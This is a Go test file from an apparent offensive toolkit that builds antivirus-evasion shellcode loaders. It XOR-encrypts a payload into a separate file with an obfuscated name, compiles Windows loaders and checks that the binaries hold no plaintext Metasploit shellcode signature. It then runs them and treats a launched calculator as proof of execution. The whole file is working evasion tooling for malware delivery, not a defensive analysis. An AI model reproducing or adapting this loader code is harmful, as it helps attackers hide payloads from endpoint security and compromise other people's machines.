package bypassAv

import (
	"EasyTools/app/bypass/shell/encode"
	"EasyTools/app/bypass/shell/util"
	"encoding/hex"
	"os"
	"os/exec"
	"path/filepath"
	"testing"
	"time"
)

// TestSepKit 分离模式 jsq 套件：exe 零载荷 + 混淆名加密载荷文件
func TestSepKit(t *testing.T) {
	if testing.Short() {
		t.Skip("short")
	}
	root := findRepoRoot(t)
	jsq, err := os.ReadFile(filepath.Join(root, "jsq.bin"))
	if err != nil {
		t.Skip("缺 jsq.bin")
	}
	dir := filepath.Join(os.TempDir(), "EasyTools", "file")
	os.MkdirAll(dir, 0o755)
	if err := util.InitGoModule(); err != nil {
		t.Fatal(err)
	}
	xorKey, _ := encode.GenerateXorKey()
	xorKeyBytes := encode.XorKeyToBytes(xorKey)
	// 载荷文件名（可任意，混淆后嵌入 loader）
	payloadName := "dl.dat"
	urlKey := byte(0xA5)
	encName := make([]byte, len(payloadName))
	for i := range payloadName {
		encName[i] = payloadName[i] ^ urlKey
	}
	encHex := hex.EncodeToString(encName)
	os.WriteFile(filepath.Join(dir, "XorKey.txt"), xorKeyBytes, 0644)
	os.WriteFile(filepath.Join(dir, "UrlXorKey.txt"), []byte{urlKey}, 0644)
	os.WriteFile(filepath.Join(dir, "UrlOrFileEncrypted.txt"), []byte(encHex), 0644)
	os.WriteFile(filepath.Join(dir, "payload.bin"), jsq, 0644)

	for _, ld := range []string{"loader1", "loader6"} {
		outDir := filepath.Join(os.TempDir(), "etavA")
		os.MkdirAll(outDir, 0o755)
		out, err := util.GenGoFile(ld, "分离", "xor", "否", "false", "false", "", "false", "", "", nil, nil)
		if err != nil {
			t.Fatalf("%s GenGoFile: %v", ld, err)
		}
		bin := filepath.Join(outDir, "sep_"+ld+".exe")
		cmd := exec.Command("go", "build", "-o", bin, out)
		cmd.Dir = dir
		cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")
		if b, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("%s build: %v\n%s", ld, err, b)
		}
		util.PostProcessBuiltBinary(bin, "windows", false)
		// 载荷密文文件落位
		cipher := encode.XorEncrypt(append([]byte(nil), jsq...), xorKey)
		os.WriteFile(filepath.Join(outDir, payloadName), cipher, 0644)
		// 明文自检：exe 不应含 msf 前缀明文
		exeB, _ := os.ReadFile(bin)
		leak := false
		for _, p := range [][]byte{{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8}, {0xfc, 0x48, 0x83, 0xe4, 0xf0}} {
			for i := 0; i+len(p) <= len(exeB); i++ {
				ok := true
				for j := range p {
					if exeB[i+j] != p[j] {
						ok = false
						break
					}
				}
				if ok {
					leak = true
					break
				}
			}
		}
		t.Logf("%s exe 大小=%d 明文泄漏=%v", ld, len(exeB), leak)
		// 本地运行验证（Dir=产物目录，验证 exe-dir 解析载荷路径）
		run := exec.Command(bin)
		run.Dir = outDir
		if err := run.Start(); err != nil {
			t.Fatal(err)
		}
		time.Sleep(6 * time.Second)
		alive := true
		if err := run.Process.Kill(); err != nil {
			run.Wait()
			alive = false
		} else {
			run.Wait()
		}
		outB, _ := exec.Command("tasklist", "/FO", "CSV", "/NH").Output()
		hasCalc := containsStr(string(outB), "calc") || containsStr(string(outB), "Calculator")
		t.Logf("%s 进程存活=%v calc出现=%v", ld, alive, hasCalc)
		if !hasCalc && !alive {
			t.Errorf("%s 分离产物运行无效果", ld)
		}
	}
}

func containsStr(s, sub string) bool {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}
